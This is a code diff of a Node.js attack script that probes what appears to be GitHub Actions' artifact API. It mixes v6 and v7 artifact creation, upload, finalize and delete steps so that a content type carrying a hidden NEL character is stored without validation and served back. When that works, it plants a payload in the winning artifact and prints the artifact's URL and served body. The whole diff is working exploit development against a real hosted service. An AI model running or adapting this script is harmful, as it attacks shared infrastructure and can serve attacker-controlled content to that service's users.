@@ -132,60 +132,68 @@ function usable(ct) {
 
 (async () => {
   const stamp = Date.now();
-  // Never tested before: v4/v6 WITH a mime_type. Our earlier v4/v6 runs sent no mime_type at all
-  // (rsct was pinned to application/zip), and v7 validates it strictly. If an older version stores
-  // mime_type without validating and still uses it for rsct, the NEL variant gets through.
-  const NELLEAD = '\u0085application/json';
-  const NELTAIL = 'application/json\u0085';
-  const trials = [
-    { v: 6, mime: NELLEAD, tag: 'v6-lead' },
-    { v: 6, mime: NELTAIL, tag: 'v6-tail' },
-    { v: 6, mime: 'application/json', tag: 'v6-clean' },
-    { v: 4, mime: NELLEAD, tag: 'v4-lead' },
-    { v: 4, mime: 'application/json', tag: 'v4-clean' },
-    { v: 7, mime: NELLEAD, tag: 'v7-lead(control)' },
-  ].map((t) => ({ ...t, name: `${t.tag.replace(/[^a-z0-9-]/gi, '')}-${stamp}` }));
+  // Our own two measurements: v4/v6 store mime_type WITHOUT validating it (the NEL variant is
+  // accepted) but ignore it (rsct = application/zip), while v7 validates it strictly and uses it
+  // for rsct. So the question is whether one artifact record can hold a v6-stored (unvalidated)
+  // mime_type and still be served through the v7 path. Simplest shapes first: same-name recreate
+  // and finalize ordering, no racing.
+  const ODD = '\u0085application/json';
+  const CLEAN = 'application/json';
+
+  const create = (name, version, mime) => twirp('CreateArtifact', {
+    ...ids, name, version, mime_type: mime,
+  });
+  const finalize = (name) => twirp('FinalizeArtifact', {
+    ...ids, name, size: String(PAD_TO),
+    hash: `sha256:${crypto.createHash('sha256').update(build(0)).digest('hex')}`,
+  });
+  const del = (name) => twirp('DeleteArtifact', { ...ids, name });
+  const url = (r) => { try { return JSON.parse(r.body.toString('utf8')).signed_upload_url; } catch { return undefined; } };
+  const hex = (x) => Buffer.from(x || '', 'latin1').toString('hex');
+
+  const shapes = [
+    { tag: 'recreate-v6odd-then-v7', steps: ['c6odd', 'u', 'c7clean', 'u', 'f'] },
+    { tag: 'recreate-v7-then-v6odd', steps: ['c7clean', 'u', 'c6odd', 'u', 'f'] },
+    { tag: 'v6odd-finalize-then-v7', steps: ['c6odd', 'u', 'f', 'c7clean', 'u', 'f'] },
+    { tag: 'v6odd-fin-del-v7-fin', steps: ['c6odd', 'u', 'f', 'd', 'c7clean', 'u', 'f'] },
+    { tag: 'v7-fin-del-v6odd-fin', steps: ['c7clean', 'u', 'f', 'd', 'c6odd', 'u', 'f'] },
+  ];
 
   let winner = null;
-  for (const t of trials) {
-    const created = await twirp('CreateArtifact', {
-      ...ids, name: t.name, version: t.v, mime_type: t.mime,
-    });
+  for (const sh of shapes) {
+    const name = `${sh.tag.replace(/[^a-z0-9-]/gi, '')}-${stamp}`;
     let signed;
-    try { signed = JSON.parse(created.body.toString('utf8')).signed_upload_url; } catch { /* noop */ }
-    if (!signed) {
-      console.log(`[-] ${t.tag} create=${created.status} ${created.body.toString('utf8').slice(0, 120)}`);
-      continue;
+    const log = [];
+    for (const step of sh.steps) {
+      if (step === 'u') { const r = await putBlob(signed, build(0), ODD); log.push(`put=${r.status}`); continue; }
+      if (step === 'f') { const r = await finalize(name); log.push(`fin=${r.status}`); continue; }
+      if (step === 'd') { const r = await del(name); log.push(`del=${r.status}`); continue; }
+      const version = step === 'c6odd' ? 6 : 7;
+      const r = await create(name, version, step === 'c6odd' ? ODD : CLEAN);
+      const u = url(r);
+      if (u) signed = u;
+      log.push(`${step}=${r.status}${u ? '' : '(no-url)'}`);
     }
-    const placeholder = build(0);
-    const put = await putBlob(signed, placeholder, t.mime);
-    const fin = await twirp('FinalizeArtifact', {
-      ...ids, name: t.name, size: String(PAD_TO),
-      hash: `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}`,
-    });
-    const sig = await signedUrlFor(t.name);
-    const id = fin.status === 200 ? await findId(t.name) : null;
+    const sig = await signedUrlFor(name);
+    const id = await findId(name);
     const dl = id ? await inspect(id) : {};
-    const hex = (x) => Buffer.from(x || '', 'latin1').toString('hex');
-    const hit = (sig.rsct && sig.rsct.includes('\u0085')) || (dl.served && dl.served.includes('\u0085'));
-    console.log(`[*] ${t.tag} create=200 put=${put.status} finalize=${fin.status} id=${id}`
-      + ` rsct=${JSON.stringify(sig.rsct)} rsct_hex=${hex(sig.rsct)}`
-      + ` served=${JSON.stringify(dl.served)} served_hex=${hex(dl.served)}${hit ? '  <-- HIT' : ''}`);
-    if (hit && id && !winner) winner = { ...t, id, signed, served: dl.served, rsct: sig.rsct };
+    const hit = (sig.rsct || '').includes('\u0085') || (dl.served || '').includes('\u0085');
+    console.log(`[*] ${sh.tag}: ${log.join(' ')} id=${id} rsct=${JSON.stringify(sig.rsct)}`
+      + ` rsct_hex=${hex(sig.rsct)} served=${JSON.stringify(dl.served)}${hit ? '  <-- HIT' : ''}`);
+    if (hit && id && signed && !winner) winner = { tag: sh.tag, id, signed };
   }
 
   console.log('\n===== HAND THIS BACK =====');
   console.log('HIT=' + Boolean(winner));
   if (winner) {
-    // leave the carrier in place: payload referencing its own id, served with the odd content type
     const payload = build(winner.id);
-    const put2 = await putBlob(winner.signed, payload, winner.mime);
+    const put2 = await putBlob(winner.signed, payload, ODD);
     const dl = await inspect(winner.id);
     console.log('TAG=' + winner.tag);
     console.log('REPOSITORY=' + `${REPO.toLowerCase()}/actions/artifacts/${winner.id}/zip`);
     console.log('ARTIFACT_ID=' + winner.id);
     console.log('REPUT=' + put2.status);
-    console.log('SERVED_CT_HEX=' + Buffer.from(dl.served || '', 'latin1').toString('hex'));
+    console.log('SERVED_CT_HEX=' + hex(dl.served));
     console.log('BODY_OK=' + (dl.body ? dl.body.equals(payload) : false));
     console.log('BODY_B64=' + (dl.body ? dl.body.toString('base64') : ''));
     console.log('SHA256=' + crypto.createHash('sha256').update(payload).digest('hex'));
